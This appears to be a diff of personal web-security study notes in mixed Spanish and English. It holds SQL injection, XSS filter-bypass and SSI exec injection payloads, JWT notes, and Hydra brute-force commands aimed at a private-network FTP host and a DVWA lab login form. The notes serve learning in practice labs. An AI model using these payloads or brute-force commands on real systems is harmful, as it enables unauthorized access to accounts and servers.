@@ -3,10 +3,16 @@ IYECTION--> ' or 1=1--  |(--) significa, la sentencia acaba aqui
 quotation marks as %22 ---> ",  injection quotes 
 xss JS -->  <scr<script>ipt> | otra forma --> ....\/ (SE PERDERA ..\ DEJANDO ../)
 take a look always in logs file if is it posible!
-Para las cooquies en NODE, usar jwt--> tokens de javascipt, token =  (header,body,sing)
+Para las cookies en NODE, usar jwt--> tokens de javascipt, token =  (header,body,sing)
 	la sign esta compuesta por el head y body, si uno de los dos cambia
 	la verficacion con la clave secreta en el servidor ya no vale
 <https://tudominio.com/que-es-una-url-canonica> --> can be useful
+
+@@@@@@@@@@@@ RAROOOOOO INYECCION SSI ---------------
+
+	<!--#exec cdm="ls -la"-->
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
 ---->> URLs are permitted to contain only the printable characters in the US-ASCII
 %3d — =
@@ -41,3 +47,8 @@ bypass -->> saltarse el paso de seguridad
     }
 </script>
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+@@@@@@@@@@@ BASIC HYDRA 
+	hydra -L user.txt -P pass.txt 192.168.1.108 ftp
+	hydra -l JhonMilton66 -P pass.txt 192.168.1.108 ftp
+hydra -l admin -P /root/Desktop/wordlists/test.txt dvwa http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username"
